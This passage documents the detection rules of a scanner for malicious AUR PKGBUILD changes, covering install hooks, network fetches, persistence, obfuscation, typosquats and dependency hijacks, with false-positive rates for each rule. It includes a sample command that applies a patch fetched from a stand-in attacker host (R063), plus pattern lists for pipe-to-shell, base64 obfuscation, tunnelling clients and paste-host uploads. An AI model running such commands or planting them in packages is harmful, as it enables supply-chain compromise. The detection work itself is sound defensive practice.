| D001 | HIGH | 5 | 0.15 % | Comfortably low for HIGH. All five are real package names that simply nothing else in the AUR depends on (`kde-rounded-corners-x11`, `python2-gevent-eventemitter`, `udfclient-fuse3`), not parser noise. |
| D002 | HIGH | 0 | 0.00 % | No false positive anywhere in the corpus. Bounded by D001, which it refines. |
| D003 | MEDIUM | 15 | 0.46 % | Almost all are `git` added to fetch submodules, the legitimate case the MEDIUM severity anticipates. |
| R060 | INFO | 694 | **21.4 %** | Why it is INFO. No narrowing reaches triage quality (`pkgver` unchanged still leaves 11.6 %, a bump that also edits `build()` is 9.8 %), so it carries weight 0 and reports context instead of scoring. Harmless at that weight, hence on by default. |
| R061 | HIGH | 7 | 0.22 % | The hits are real build-time downloads (`apple-fonts`, `ttf-ms-win-*`, `gamescope-nvidia`), which is the behaviour the rule exists to surface rather than noise. |
| R076 | MEDIUM | 0 | 0.00 % | Needs both an unsafe literal version and its interpolation into a source URL. |
| R077 | HIGH | 1 | 0.03 % | A legitimate `$HOME/.config/...log` write from a `post_upgrade`. |
| R079 | HIGH/MED | 4 | 0.12 % | Maintainers tracking a moving patch branch under a fixed version, which is the shape the rule describes. |
| R080 | MEDIUM | 6 | 0.18 % | Schemes outside the shipped allowlist. |
| R084 | HIGH | 0 | 0.00 % | `mktemp -d` is excluded wholesale, so private scratch directories never count. |
| R087 | HIGH | 0 | 0.00 % | The one paste-host reference in the corpus is a gist download, which is R061's. |
| R085 | HIGH | 0 | 0.00 % | Reads the unit's `ExecStart`, not its filename. |
| R086 | INFO | 0 | 0.00 % | `env` was dropped after a `sed` expression read as a command position. |
| R088 | HIGH | 0 | 0.00 % | Deliberately the quietest of the persistence group. |
| R089 | INFO | 0 | 0.00 % | A benign diff with one or two hits cannot reach three distinct stages. |
| R106 | tiered | 0 | 0.00 % | With the shipped (empty) list and with a synthetic one. A positive control (`github.com`) fires on 1561 diffs, so the surface extraction is real. |
| R114 | MEDIUM | 4 | 0.12 % | Packages that legitimately ship pacman hooks. |
| R115 | MEDIUM | 0 | 0.00 % | An unchanged epoch never surfaces in a hunk. |
| R116 | HIGH/MED | 0 | 0.00 % | Related name shapes suppress; cold start cannot fire. |
| R117 | INFO | 0 | 0.00 % | Weight 0. Anchoring the check on an ANSI-C quote opener removed four regex end-anchor false positives. |
| R119 | HIGH | 0 | 0.00 % | Architecture checks are not probes. |
| R120 | HIGH | 0 | 0.00 % | A type check on decoded bytes, so encodings do not need enumerating. |
| R121 | HIGH | 0 | 0.00 % | Heredoc bodies are excluded from command scanning. |
| R123 | HIGH | 0 | 0.00 % | Command-position anchored; a client in `makedepends` is a declaration. |
| R124 | HIGH | 0 | 0.00 % | Still zero after the execution match was widened to a path with arguments. |
| R128 | HIGH | 0 | 0.00 % | A representative backdoor fixture goes from 25 to 50 with it. |
| R129 | HIGH | 3 | 0.09 % | One package resolving a redirect with `curl` at the top level, which really does fetch on a metadata refresh. |
| R130 | HIGH/MED/INFO | 6 | 0.18 % | Two introductions and four upstream key rotations. |
| R131 | HIGH/MED | 3 | 0.09 % | One wine package that genuinely disables FORTIFY_SOURCE. |

Getting D001 from 5.95 % to 0.15 % took two extractor fixes, both found by this measurement rather than by review:

- An unbounded fallback for unquoted array entries read shell fragments (`if`, `[[`, `!`) out of a `package()` body as dependency names.
- Comments inside dependency arrays contributed every word of the note (`required`, `because`, `disabled`).

Both are covered by regression tests in `tests/test_deps_rules.py`.

### R062: Install Hook Fetches Or Executes {#r062}

- **Target:** programmatic (defined in `src/trustsight/analysis/build.py`)
- **Severity:** HIGH (weight 25)
- **Category:** `installer`
- **Description:** A `.install` hook body (`post_install`, `post_upgrade`, `pre_install`, `pre_upgrade`, `pre_remove`, `post_remove`) downloads something or performs a privileged operation: `chmod u+s`, `systemctl enable`, `eval`, `useradd`.

Hooks run **as root at install time**, which makes them the highest-privilege code a PKGBUILD carries. `generate_diff()` already includes `*.install` patches, and `_classify_enclosing_function()` recognises `post_install()` exactly as it recognises `build()`, so no separate parser is involved.

Comments are stripped before matching: one of the corpus hits was the line `# systemctl enable input-remapper`.

Overlaps [R007](#r007), which matches any line mentioning `.install` at MEDIUM. R007 is left as it is because it is calibrated and in the baseline; R062 is the narrow, higher-severity companion.

### R063: Patch Applied From Outside The Build Tree {#r063}

- **Target:** programmatic (resolved command lines)
- **Severity:** HIGH (weight 25)
- **Category:** `integrity`
- **Description:** `patch` or `git apply` inside a build function takes its input from a URL, an absolute path, or process substitution.

```bash
patch -p1 < <(curl https://evil.example/x.patch)   # fires
patch -p1 -i /tmp/x.patch                          # fires
patch -p1 -i "$srcdir/fix.patch"                   # does not fire
```

This rule deliberately does **not** check membership of `source=()`. Patches routinely arrive inside the extracted tarball, so absence from `source=()` does not mean a patch is undeclared, and no static check can separate the two. That broader form was measured at 2.13 % of benign diffs; asking where the input comes from instead measures 0.00 %.

### R064: Source URL Downgraded To HTTP {#r064}

- **Target:** programmatic (diff-aware)
- **Severity:** MEDIUM (weight 15)
- **Category:** `network`
- **Description:** A URL declared in `source=()` as `https://` before the diff appears as `http://` after it, with the same host and path. Plain http was never upgraded; this is a URL that lost its transport security.

Distinguishing a downgrade from a URL that was always http needs both sides of the diff, which is why `extract_source_array_urls()` takes a `side` parameter.

---

## Temporal context rules (R065-R067) {#temporal-rules}

Defined in `src/trustsight/analysis/temporal.py`. They inspect git commit timestamps on
the AUR repository to surface temporal signals. None require a diff, so they
also fire on first-seen packages in `_make_fresh_analysis()` (in `pipeline.py`).

All three are **on by default** with no config toggle.

### R065: Very Recent Update {#r065}

- **Target:** programmatic (commit timestamp)
- **Severity:** INFO (weight 0)
- **Category:** `temporal`
- **Condition:** AUR HEAD commit is less than 72 hours old.

Packages updated moments ago have not been visible to the community long enough
for anyone to vet them. Combined with other signals - maintainer change, new
source domains - recency escalates suspicion.

### R066: Brand New Package {#r066}

- **Target:** programmatic (root commit timestamp)
- **Severity:** INFO (weight 0)
- **Category:** `temporal`
- **Condition:** The package's first commit on AUR is less than 30 days old.

A package that barely exists has no reputation. An established package with a
recent update is routine; a package uploaded last week has zero track record.

### R067: Stale Package Revived {#r067}

- **Target:** programmatic (commit timestamp gap)
- **Severity:** MEDIUM (weight 15)
- **Category:** `temporal`
- **Condition:** The previously analyzed commit is more than 365 days older than
  the new HEAD - an abandoned package that suddenly has activity.

Account takeovers happen on stale packages: a maintainer stops responding,
someone else adopts the AUR record, and the new maintainer may be malicious.
A gap of a year or more between the version you already have and the one being
offered is worth a medium-weight flag, independent of any diff signal.

---

## Install and build context rules (R068-R070) {#install-build-rules}

Defined in `src/trustsight/analysis/build.py` and `src/trustsight/analysis/pipeline.py`. They
inspect the diff for changes to security-critical build and install
infrastructure - hooks that run as root, signature verification that gets
dropped, environment variables that subvert the compiler.

### R068: Install Hook Present {#r068}

- **Target:** programmatic (diff-aware)
- **Severity:** INFO (weight 0)
- **Category:** `context`
- **Condition:** The PKGBUILD declares an `install=` file, or the diff touches
  a `*.install` file.

An `.install` scriptlet runs code **as root** at install time. R068 is pure
context - "this package has a root-time hook" - not an accusation. It is the
metadata a human wants when weighing other signals.

**Origin:** mirrors pnpm's `allowBuilds`/`strictDepBuilds` - every package
manager that distinguishes "declares a privileged post-install step" from
"does not" treats that distinction as primary metadata. pnpm blocks all build
scripts by default; R068 is the review-side equivalent - flagging `.install`
hooks so a human can weigh them.

**Overlap guard:** R007 already fires on *install added*. R068 fires on
*install present* (existing or added). If R007 fires, R068 is redundant for
that diff; the two must not both surface as separate findings for the same
event.

### R069: GPG Verification Removed {#r069}

- **Target:** programmatic (diff-aware)
- **Severity:** HIGH (weight 25) - corpus rate 0.03 %
- **Category:** `integrity`
- **Condition:** `validpgpkeys` was **populated before** the diff and is
  **emptied or removed after** - the package previously verified upstream
  signatures and now does not.

This is the exact inverse of the verification-evidence you already *subtract*
for. `detect_verification_evidence` adds a `validpgpkeys_declared` discount
when signatures are present; R069 adds a positive signal when that protection
is **removed**. Dropping GPG verification is a strong supply-chain signal with
near-zero benign rate: maintainers almost never remove working signature
verification.

**Origin:** npm registry signatures and pnpm's `verifyStoreIntegrity` - both
tools treat a dropped integrity check as a critical signal. npm's `audit
signatures` command rejects packages whose registry ECDSA signature is missing
or mismatched; pnpm's content-addressable store refuses to link corrupted
files. R069 is the AUR analogue: `validpgpkeys` being removed means the
package dismantled a verification layer it previously had.

**Scope:** DELTA-scoped - fires on `validpgpkeys` *transitioning* from
populated to empty/absent, following the same structure as
`detect_checksum_changes` and `detect_checksum_removed` in `differ.py`.

### R070: Build Environment Subversion {#r070}

- **Target:** programmatic (resolved lines, position-scoped)
- **Severity:** HIGH (weight 25) for `LD_PRELOAD`/`LD_LIBRARY_PATH`;
  MEDIUM (weight 15) for `CFLAGS`/`LDFLAGS`/`MAKEFLAGS`/`PATH` -
  corpus rate 0.25 % (all HIGH; MEDIUM not observed)
- **Category:** `build`
- **Condition:** The diff **modifies** `LD_PRELOAD`, `LD_LIBRARY_PATH`,
  `CFLAGS`, `LDFLAGS`, `MAKEFLAGS`, or `PATH` **inside a build function**
  (`prepare`/`build`/`package`).

Injecting a malicious object via `LD_PRELOAD`/`LDFLAGS`, or redirecting the
compiler/linker via `PATH`, is a classic build-time attack - the untrusted
input silently subverts the build.

**Predicate discipline - the position+delta scope is essential:** `CFLAGS`
and `MAKEFLAGS` appear in a large fraction of benign PKGBUILDs (`makepkg`
sets them routinely; many packages tweak them legitimately). Matching their
*presence* file-wide would be a census - the C001 mistake repeated. The
signal is: the variable is **modified in the diff** (delta, not presence),
**inside a build-function body** (position), on **resolved lines** (post
variable-expansion, so obfuscation cannot hide it).

The split severity reflects the benign rate: `LD_PRELOAD` and
`LD_LIBRARY_PATH` are almost never legitimate inside a PKGBUILD build
function; `CFLAGS`/`LDFLAGS`/`MAKEFLAGS`/`PATH` have legitimate uses and may
need the corpus to set the right severity level.

**Origin:** Nix's build sandbox (denies build processes all network and only
exposes declared inputs) and cargo-crev's `build.rs` scrutiny (flags crates
that run arbitrary code at build time). Both recognise that *untrusted inputs
subverting the build* is the attack surface Nix closes and Cargo leaves open.
`LD_PRELOAD`/`LD_LIBRARY_PATH` mutation inside a build function is the AUR
equivalent of a `build.rs` that downloads and executes a binary.

---

## Maintainer and capability rules (R071-R072) {#maintainer-capability-rules}

### R071: Untrusted Maintainer Takeover {#r071}

- **Target:** programmatic (maintainer delta + global novelty)
- **Severity:** HIGH (weight 25) - always on; corpus rate TBD (requires live git history)
- **Category:** `maintainer`
- **Condition:** `maintainer_changed` is true **AND** the new maintainer is
  **globally novel** (never seen in the database across any package).

This is C006 (maintainer change) × global novelty - the "local signal weighted
by global rarity" composition the accuracy work identified as the missing
multiplier. A *known* maintainer adopting a package is routine (orphan
adoptions happen constantly). An *unknown* maintainer taking over is the
account-compromise / hostile-takeover shape. The novelty gate is what turns a
noisy signal (all maintainer changes) into a precise one (takeovers by
strangers).

**Origin:** pnpm's `trustPolicy: no-downgrade` and Socket.dev's maintainer
behaviour analysis. pnpm refuses to install a package whose trust evidence has
weakened since the previous version; Socket flags packages where a new,
never-before-seen maintainer gains publish permissions - the most reliable
precursor to a malicious release. R071 composes those two ideas: maintainer
change (pnpm's "trust changed") gated by global novelty (Socket's "never seen
before"), applied to AUR maintainers instead of npm publishers.

**Cold-start gate:** On a fresh database every maintainer is globally novel,
so R071 fires on 100 % of maintainer-changed packages on first run. It is
suppressed until the maintainer table has enough history for "globally novel"
to mean something - gated identically to the other novelty signals via
[`maturity()` and `observation_count`](configuration.md#cold-start-and-maturity).

### R072: Capability Density Anomaly {#r072}

- **Target:** programmatic (existing `triggered_rules`, no new detection)
- **Severity:** INFO (weight 0) - report-only co-occurrence flag
- **Category:** `meta`
- **Condition:** A single diff has rule hits in **3+ distinct capability
  categories** (e.g. `network` + `filesystem` + `execution` + `encoding`).

Most updates change one thing. A diff that *simultaneously* adds a network
fetch, writes a file, and base64-decodes a payload is disproportionate; the
co-occurrence is more suspicious than the sum of its parts.

**Why weight 0:** Adding a score for the combination would **double-count**;
the three categories already scored individually via their own rules. Stacking
extra points on top would inflate the benign p95, exactly the inflation the
accuracy work eliminated. R072 therefore carries weight 0: it is a
**co-occurrence annotation** surfaced to the report.
The pattern is the signal; the points are already there.

**Origin:** Socket.dev's capability profiling - every package is annotated
with a capability profile (network access, filesystem access, shell execution,
encoded payloads) and Socket's diff view flags *permission creep* when a new
version acquires capabilities it did not have before. R072 is the same insight
at the rule-category level: a diff whose rule hits span multiple capability
domains has a density that is itself a pattern.

---

## Temporal metadata (R073) - not a scored finding {#r073}

### R073: Accelerated Release Cadence {#r073}

- **Target:** programmatic (git commit graph)
- **Severity:** metadata field, **never a scored finding**
- **Category:** `temporal-metadata`
- **Condition:** The HEAD commit has 3+ ancestors within the last 24 hours
  (rapid-fire pushes).

**Why it does not score:** Bursts of commits are overwhelmingly benign
activity - a maintainer fixing a bad checksum, then a typo, then a rebuild
bump. This is precisely the "measuring activity, not risk" failure the
accuracy work's CI gate (`|pearson(score, diff_lines)| < 0.3`) exists to
catch. At any non-zero weight it becomes a census on active maintainers.

R073 is therefore **metadata only**: recorded as a boolean on the
`PackageFact` (`recent_commit_burst: bool`). It is not appended to
`triggered_rules` and contributes nothing to the score. If future corpus
analysis shows that burst cadence *pairs with* other signals (burst +
maintainer takeover + verification removal), the burst multiplier can be
applied to those signals alone - never as a standalone finding.

**Origin:** pnpm's `minimumReleaseAge` (24-hour cooldown on new versions) and
uv's `exclude-newer` (reject packages published within a configurable window).
Both tools impose a *registry-side cooldown*: do not install a version until
it has existed long enough for the community to vet it. R073 takes the
opposite perspective - instead of blocking recent versions, it notes that
multiple commits landed in a short window, recording the cadence as context
for other signals to use.

---

## Naming rule (R074) - package-name typosquat {#r074}

### R074: Package-Name Typosquat {#r074-rule}

- **Target:** programmatic (package name against seeded candidate list)
- **Severity:** HIGH (weight 25) - corpus rate 1.12 % (package-name scan)
- **Category:** `naming`
- **Condition:** The package's own name is Damerau-Levenshtein distance ≤2 (or differs only by separator/homoglyph) of an **established, far-more-popular** package - AND is not an expected variant (`-git`, `-bin`, `-debug`, `-lts`, etc.) of that package.

This is the AUR equivalent of the `python-sqlite` vs `pysqlite`, `electron` vs `electorn`, and trailing-space/separator-swap attacks that have hit every other registry. The AUR has **zero** typosquat defense; D002 already covers *dependency* names, but nothing covers the package's **own name** impersonating a popular one.

**The asymmetric gate (the make-or-break):**

Symmetric edit-distance is a census generator: `foo-git`, `foo-bin`, `foo-lts`, and every legitimate fork are distance-small from `foo`. This rule fires ONLY when all hold:

1. **Similar** - Damerau-Levenshtein ≤2 to a candidate `C`.
2. **Asymmetric popularity** - `C` is observed 10x+ more often (via `dependency_observation_count`) than this package. A squat impersonates something bigger.
3. **Not a variant** - Expected suffixes (`-git`, `-bin`, `-debug`, `-lts`, `-stable`, `-beta`, `-svn`, `-hg`, `-bzr`, `-cvs`, `-wine`, `-appimage`, `-flatpak`, `-nightly`, `-devel`, `-common`) are stripped before comparison.

**Origin:** npm/PyPI/crates typosquat detection - the most exploited supply-chain vector in every other ecosystem. The AUR is defenseless against it.

---

## Dependency-set expansion rule (R075) {#r075}

### R075: Dependency-Set Expansion {#r075-rule}

- **Target:** programmatic (delta over dependency arrays × per-dep novelty)
- **Severity:** MEDIUM (weight 15) - corpus rate 0.34 %
- **Category:** `dependency`
- **Condition:** A single diff adds 3+ `depends`/`makedepends`/`optdepends`/`checkdepends` entries whose **count × mean rarity** exceeds the expansion gate (≥1.5, tuned on corpus).

**Why not count alone:** Adding 5 deps that are all common (`glibc`, `qt6-base`, `cmake`) is a normal heavy build and should not fire. The signal is count **weighted by how rare/novel each added dep is**, reusing D001's `dependency_observation_count` as a rarity proxy. Novel/obscure deps push the magnitude up; common deps contribute near zero.

**No double-count with D001:** R075 fires on the **aggregate pattern** (multiple rare deps appearing together), which is a materially different signal from any single dep being novel. Individual D001 per-dep firings remain untouched. This is not the R072 mistake: the aggregate condition captures a different phenomenon (co-occurrence, not individual presence).

**Origin:** Socket/Snyk dependency-surface profiling - a version bump that expands the dependency graph with obscure entries is the "expand attack surface quietly" shape. D001 already flags each novel dep individually; R075 catches the disproportionate co-occurrence.

---

## Install and build context rules (R081-R082) {#r081-r082}

Defined in `src/trustsight/analysis/build.py`. They inspect install hooks and
build-function content for additional risk signals. Both graduated from experimental
to enabled by default in v0.11.0 with zero false positives on the 3243-diff benign corpus.

### R081: Foreign Package Manager In Install Hook {#r081}

- **Target:** programmatic (resolved install hook lines, position-scoped)
- **Severity:** HIGH (weight 25)
- **Category:** `installer`
- **Condition:** An added line inside an install hook body (`post_install`, `post_upgrade`, `pre_install`, `pre_upgrade`, `pre_remove`, `post_remove`) invokes a foreign package manager: `pip install`, `npm install`, `cargo install`, `gem install`, `go install`, `dnf install`, `yum install`, `apt-get install`, `pacman -S`/`-U`, or `make install` without `DESTDIR`.

Install hooks run as root at install time. Invoking another package manager
from inside an AUR package's install hook modifies system state outside pacman's
control, creating untracked dependencies and potential conflicts.

Kernel modules (`dkms`), initramfs rebuilds, and service restarts are the
expected scope of an install hook; foreign package managers are not.

### R082: Shell Obfuscation Density {#r082}

- **Target:** programmatic (resolved build-function lines, position-scoped)
- **Severity:** MEDIUM (weight 15)
- **Category:** `obfuscation`
- **Condition:** A single added line inside a critical build function (`build()`, `prepare()`, `check()`, `package()`) contains **3 or more** distinct obfuscation indicators:

| Indicator | Pattern |
|-----------|---------|
| Base64 decode | `base64 -d` / `base64 --decode` |
| Hex escape | `printf '\x...'` |
| Command substitution | `$(` or `` ` `` |
| Eval | `eval` |
| Pipe to shell | `\| bash` / `\| sh` / `\| zsh` |
| URL shortener | `bit.ly`, `t.co`, `tinyurl`, `shorturl`, `ow.ly`, `is.gd` |
| Quiet wget pipe | `wget -q -O - \|` |
| Variable expansion with network/shell | `${var}...curl` / `${var}...bash` |

A single obfuscation indicator is unusual but can be legitimate (e.g. `eval`
for dynamic configuration). Three or more on the same line is characteristic
of deliberately hidden behaviour: each layer adds indirection, and the density
itself is the signal.

---

## D-series dependency rules {#d-series}

Defined in `src/trustsight/analysis/dependencies.py`, not in `rules.toml`. They compare the
dependency arrays before and after the diff and consult the local database, so
they cannot be expressed as a pattern over a single line.

They also have to bypass the engine's own filtering: `rules.py` strips
`depends`, `makedepends`, `optdepends`, and `checkdepends` lines before any
pattern runs, which is why extraction lives in `src/trustsight/deps.py`.

All D-series rules are **enabled by default** since v0.7.0. Disable them
individually under [`[experimental_rules]`](configuration.md#experimental_rules).

### D001: Novel Dependency Added {#d001}

- **Severity:** HIGH (weight 25)
- **Category:** `dependency`
- **Description:** A dependency name appears that has never been observed anywhere in the AUR. Either a typo or a package created specifically to be pulled in.

The corpus of known names is seeded from every `depends`/`makedepends`/`optdepends`/`checkdepends` entry in the AUR, **plus every package name and `provides` alias**. Without the latter, a real package that simply nothing else depends on would read as novel.

If the corpus has not been seeded the rule stays silent, rather than treating an empty table as "nothing has ever been seen".

Three classes of name are never considered novel, each an observed false positive:

| Ignored | Example | Why |
|---------|---------|-----|
| Unresolved variables | `$_pkgname`, `${pkgbase}` | Not a name; the tokenizer could not expand it |
| Sonames | `libwlroots-0.21.so` | Satisfied by whichever package provides that ABI |
| Companion split packages | `jellyfin-desktop-libcef-bin` alongside `jellyfin-desktop-git` | Belongs to the same project, so it is expected to be globally unknown |

### D002: Typosquatted Dependency {#d002}

- **Severity:** HIGH (weight 25)
- **Category:** `dependency`
- **Description:** A novel dependency name within one or two edits (Damerau-Levenshtein, so transpositions count) of a popular package: `openss1` for `openssl`, `cur1` for `curl`.

D002 **refines D001**: only a name D001 has already found to be globally unknown is compared, and D002 is reported instead of D001 when it matches. That ordering is what makes the check both affordable and correct. A precomputed table of confusable pairs cannot work, because a table built from existing package names can only contain names that must *not* fire, while the names that should fire do not exist yet.

Popularity is taken from `observation_count`, so no separate package list is shipped. The distance threshold scales with length: short names sit close to many unrelated real packages, with `yay` one edit from `yak`, `yam`, `jay`, and `may`.

### D004: Dependency Hijack Via Provides {#d004}

- **Severity:** HIGH (weight 25)
- **Category:** `dependency`
- **Description:** `provides=` or `replaces=` declares an **established package unrelated to this one**. `provides=('openssl')` or `replaces=('sudo')` installs this package in front of the real one, satisfying every dependency on it.

"Established" means present in the official repositories (`pacman -Slq`), falling back to `observation_count` when pacman cannot be reached.

Relatedness is what makes this usable, since declaring a variant of yourself is the ordinary pattern. Two forms are accepted:

| Shape | Example | Fires |
|-------|---------|-------|
| One name is a prefix of the other | `htop-vim` provides `htop` | no |
| Shared leading token (siblings) | `linux-cachyos` provides `linux-headers` | no |
| Shared token is a generic ecosystem prefix | `python-evil` provides `python-requests` | **yes** |
| No relationship | `some-pkg` provides `openssl` | **yes** |

The ecosystem carve-out matters: thousands of unrelated packages share `python-`, so treating that as evidence of a common project would suppress exactly the hijack the rule exists to catch.

### D003: New Network-Using Makedepends {#d003}

- **Severity:** MEDIUM (weight 15)
- **Category:** `dependency`
- **Description:** `makedepends` gains a network-capable tool (`curl`, `wget`, `git`, `python-requests`, …) that was not there before, meaning the build can now fetch code that no checksum covers.

MEDIUM because adding `git` to fetch submodules is legitimate. It is a signal, not a verdict.


---

## Network-surface rules (R076, R079, R080, R087, R123, R129) {#network-surface-rules}

These six ask one question in different places: what does this recipe reach
over the network, in which direction, and when.

### R076: Version-In-URL Injection {#r076}

- **Target:** programmatic (`analysis/network.py`)
- **Severity:** MEDIUM (weight 15)
- **Category:** `network`
- **Condition:** `pkgver` or `_pkgver` is assigned a literal containing characters outside `[A-Za-z0-9._+-]`, and that variable is interpolated (braced or bare) into a source URL.

Both halves are required. An unsafe version string that is never interpolated
stays quiet, and an interpolated version made only of version characters is
ordinary packaging. What the rule describes is a value carrying delimiters
(`;`, whitespace, `/`) being substituted into something the build fetches.

Fire rate: 0 on all 3246 benign-corpus diffs.

### R079: Moved Git Ref {#r079}

- **Target:** programmatic (`analysis/network.py`)
- **Severity:** HIGH (weight 25) when a tag anchor is unchanged, MEDIUM (weight 15) otherwise
- **Category:** `integrity`
- **Condition:** Either the repository's commit pin moved while the declared version did not, or a digest `#commit=` was replaced by a movable `#tag=`/`#branch=`.

A tag is a name upstream can repoint at will, so "the same tag" is not the
same code twice. TrustSight never resolves a tag against the network (see
[the threat model](../explanation/threat-model.md)), so the rule works from
declared facts: the commit a recipe pins, and the version it claims.

- **Ref moved under a stable version.** The `#commit=`/`#revision=` digest
  changed, in the source fragment or in the `_commit`-family variable feeding
  it, while `pkgver`, `pkgrel`, `epoch` and the declared tag did not. Anyone
  who built this version yesterday has different code from anyone who builds
  it today, under one version string.
- **Pin loosened.** A digest became a tag or a branch. This is reported even
  during a version bump: dropping the pin is the change.

HIGH needs a tag anchor that is provably unchanged, which is literally "this
tag now resolves to a different commit". The reverse direction, a tag being
replaced by a digest, is tightening and stays quiet. A digest variable that
feeds a patch URL rather than a git ref is not a checkout pin, and the edit it
belongs to is C003's neutral fact.

Fire rate: 4 of 3246 benign diffs (0.12 %), all maintainers tracking a moving
patch branch under a fixed version, which is the shape the rule describes.

### R080: Exotic Source Protocol {#r080}

- **Target:** programmatic (`analysis/network.py`)
- **Severity:** MEDIUM (weight 15)
- **Category:** `network`
- **Condition:** A `source=` entry uses a scheme outside the `[hosts] source_schemes` allowlist. The base of a `transport+base` token is what is judged, so `git+https://` is read as `https`.

`data:` URIs carry no `://` and are not scheme tokens, which is an accepted
gap rather than a silent pass.

Fire rate: 6 of 3246 (0.18 %).

### R087: Upload To Paste Or File-Drop Host {#r087}

- **Target:** programmatic (`analysis/network.py`)
- **Severity:** HIGH (weight 25)
- **Category:** `exfil`
- **Condition:** A build or install function invokes `curl`/`wget` with a request body (an upload flag from `[patterns] upload_flags`) against a host in `[hosts] paste_hosts`.

Direction is the entire rule. The same host list also feeds the
`raw_hosting` source bucket, so a paste host in `source=()` is already carried
at +15 and a rule that fired on it would double-count that weight. What no
bucket can see is the other direction: a request leaving a build with a body
attached, addressed to a host whose purpose is to accept an anonymous drop and
hand back a link.

Fetching from one of these hosts is not this rule. A `curl` pulling a patch
from a gist is an undeclared download, which R061 already reports. Posting to
that same gist is data leaving the machine that is building the package, and it
is the evidence behind R089's `exfil` stage. On a line R087 claims, R061 stands
down: describing an upload as a download would be wrong as well as scored
twice.

The destination is an auditable list rather than a guess about what an endpoint
is for, so an upload to a project's own CI host does not fire.

Fire rate: 0 of 3246. The corpus contains one paste-host reference, a gist
download in `gamescope-nvidia`, which stays R061's.

### R123: Covert Egress {#r123}

- **Target:** programmatic (`analysis/network.py`)
- **Severity:** HIGH (weight 25)
- **Category:** `network`
- **Condition:** An added line references a `.onion`/`.i2p` host, issues a DNS-over-HTTPS query or names a configured DoH endpoint, or invokes a tunnelling client (`torsocks`, `socat`, `ngrok`, `chisel`, `frpc`, ...) at a command position inside a build or install function.

The command-position anchor is what separates use from mention: a client named
in a string or listed in `makedepends` never fires.

Fire rate: 0 of 3246.

### R129: Parse-time Network Fetch {#r129}

- **Target:** programmatic (`analysis/network.py`)
- **Severity:** HIGH (weight 25)
- **Category:** `network`
- **Condition:** A network client from `[patterns] parse_time_fetch` runs at a command position **outside every function**, in the PKGBUILD or an install file.

Everything at the top level executes as soon as makepkg sources the recipe,
which happens on `makepkg --printsrcinfo`, on an AUR helper's metadata refresh,
and on anything else that reads the file. That is before a build step runs and
before the checksum array covers anything. R010 and R011 report a downloader
inside a build function at LOW; running one at parse time is a different claim,
so it is a different rule.

Quiet by construction on declarations: `DLAGENTS=(...)` and any other
assignment whose *value* merely names a downloader configures makepkg rather
than fetching. An assignment that *runs* one through a command substitution
(`_ver=$(curl ...)`) is not a declaration and is not exempt. A fetch piped
straight into a shell belongs to R001/R002, whose claim is heavier, so R129
yields rather than scoring the same line twice.

Fire rate: 3 of 3246 (0.09 %), all one package resolving a redirect with
`curl` at the top level, which really does reach the network on a metadata
refresh.

---

## Install-path persistence (R077, R084, R085, R088, R114, R128) {#persistence-rules}

One shared write-target resolver backs this group (`analysis/persistence.py`):
`install`/`cp`/`mv`/`ln` destinations including `-t DIR`, `>` redirects, and
the verb-substitution forms `tee`, `dd of=`, `mkdir -p`, `touch`, `rsync` and
`sed -i`. Every match is command-position anchored, so a quoted string such as
`'cp x ~/.zshrc'` never reads as a write.

### R077: Write To User Home Or RC {#r077}

- **Severity:** HIGH (weight 25)
- **Category:** `persistence`
- **Condition:** A build or install function writes into `$HOME`, `.bashrc`, `.zshrc`, `.profile` or `.config`, outside `$pkgdir` staging.

Fire rate: 1 of 3246 (0.03 %), a legitimate log path written from `post_upgrade`.

### R084: World-Writable Staging {#r084}

- **Severity:** HIGH (weight 25)
- **Category:** `persistence`
- **Condition:** `/tmp`, `/var/tmp` or `/dev/shm` is used as a working or execution directory. `mktemp -d` is excluded wholesale: a random private directory is not a fixed world-writable path.

Fire rate: 0 of 3246.

### R085: Systemd ExecStart From Runtime-Writable Path {#r085}

- **Severity:** HIGH (weight 25)
- **Category:** `persistence`
- **Condition:** A systemd unit the package installs has an `ExecStart` pointing into a runtime-writable path (`/tmp`, `/var/tmp`, `/dev/shm`, `$HOME`, `/run`).

The rule reads the unit's *content*, including a heredoc body, not the unit's
filename. A name proves nothing; the `ExecStart` line is the fact.

Fire rate: 0 of 3246.

### R088: Hidden Drop {#r088}

- **Severity:** HIGH (weight 25)
- **Category:** `persistence`
- **Condition:** A leading-dot (hidden) executable is written outside `$srcdir` and `$pkgdir`.

R088 is deliberately the quietest rule in the group so that one payload does
not fire three times: a hidden write that is later executed belongs to
R121/R124, one in a world-writable directory to R084, one in the user's home to
R077. R088 claims only the hidden drop none of those own.

Fire rate: 0 of 3246.

### R114: Pacman Hook Installed {#r114}

- **Severity:** MEDIUM (weight 15)
- **Category:** `persistence`
- **Condition:** A file is placed under `/usr/share/libalpm/hooks/`.

A pacman hook runs on every later transaction, which is why it is reported;
packages legitimately ship them, which is why it is MEDIUM.

Fire rate: 4 of 3246 (0.12 %), all packages that legitimately ship hooks.

### R128: Build Writes Outside Staging Root {#r128}

- **Severity:** HIGH (weight 25)
- **Category:** `persistence`
- **Condition:** `prepare`, `build`, `check`, `package` or a top-level line writes to a plain absolute path outside `$srcdir`/`$pkgdir`.

Rather than a list of interesting directories, the rule is the shape: a
packaging step may only write inside the staging roots. An absolute system path
changes the machine doing the build, and pacman tracks none of it. Top level is
the worse case, because it runs when makepkg sources the file. Install hooks
are excluded, since R077/R084/R085/R114 own the target system. Devices
(`> /dev/null`) and extractor artefacts are excluded by requiring a plain
absolute path.

Fire rate: 0 of 3246.

---

## Reconstruction and delivery (R117 to R124, R127) {#delivery-rules}

### R117: Obfuscated Literal Reconstructed {#r117}

- **Severity:** INFO (weight 0)
- **Category:** `obfuscation`
- **Condition:** An added line changes under literal reconstruction (ANSI-C hex `$'\x62\x75\x6e'`, ANSI-C octal, empty-quote concatenation `b''u''n`, `$(printf '\x62...')`) and the reconstruction reveals a word the raw line did not carry, or an ANSI-C quote survives reconstruction.

The tokenizer rebuilds these forms so that R081, R003 and R039 match on what a
line *means* rather than how it is spelled. R117 is what tells the reader that
this happened: without it the report quotes text the file does not contain. It
carries no weight, so it cannot move a score; it changes what the reader is
looking at.

A literal that cannot be rebuilt is reported as the inconclusive case.
Unreconstructable input is never read as clean.

Fire rate: 0 of 3246.

### R118: Embedded Binary In Tree {#r118}

- **Severity:** HIGH (weight 25)
- **Category:** `integrity`
- **Condition:** A file in the repository tree carries ELF magic (`\x7fELF`) and is not a declared `source=` filename.

R118 has two variants that split by evidence and never double-fire. **R118-tree**
is this one: it needs the file manifest, so it runs on the git path, where the
clone is always available, and on the corpus path when the AUR snapshot tarball
was fetched. When the corpus path has no snapshot, the result reports
`tree_analyzed = false` rather than reading as a clean full-coverage result.
